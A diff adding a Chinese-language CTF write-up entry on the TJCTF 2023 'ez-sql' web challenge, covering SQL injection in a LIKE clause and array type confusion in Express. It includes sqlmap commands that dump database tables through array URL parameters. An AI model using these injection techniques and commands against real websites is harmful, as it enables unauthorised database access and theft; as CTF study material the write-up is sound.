@@ -2113,3 +2113,19 @@ if __name__ == '__main__':
     for i in range(threads):
         t.join()
 ```
+228. [ez-sql](https://github.com/TJCSec/tjctf-2023-challenges/tree/main/web/ez-sql),[wp](https://www.youtube.com/watch?v=AqV3YUtcKGU&t=440s)
+- LIKE字段处的sql注入。`SELECT * FROM table WHERE column LIKE '%name%'`,其中name内容完全可控。LIKE语句并不会影响union等多种注入的手法，`%`号表示匹配0或多个任意字符，也不会影响注入的结果。
+- 当在express web里看见：
+```js
+const app = express();
+app.use(express.urlencoded({ extended: true }));
+```
+表示url可传递数组。若网站逻辑没有明显区分传递的参数类型（如字符串与数组，两者都有length字段），此时就能考虑是否有type confusion了。
+- js打印数组特性。
+```js
+name=['a','b'];
+SELECT * FROM table WHERE column LIKE '%${name}%';
+//SELECT * FROM jokes WHERE joke LIKE '%a,b%'
+```
+数组元素之间会用`,`连接起来。
+- 当sql注入点在url传入的参数且参数是个数组时，可利用sqlmap注入url的数组传参。`sqlmap --url "http://xxx.com/search?name[0]=a&name[1]=2" -p "name[0]" --level 5 --risk 3 --dbms=sqlite --tables -dump`。如果数据库的类型不知道也可以不指定。此为测试语句，当测试出来哪种方法最快时，可以直接对sqlmap指定注入方式(例如union select)。`sqlmap --url "http://xxx.com/search?name[0]=a&name[1]=2" -p "name[0]" --dbms=sqlite --tables --technique=U`
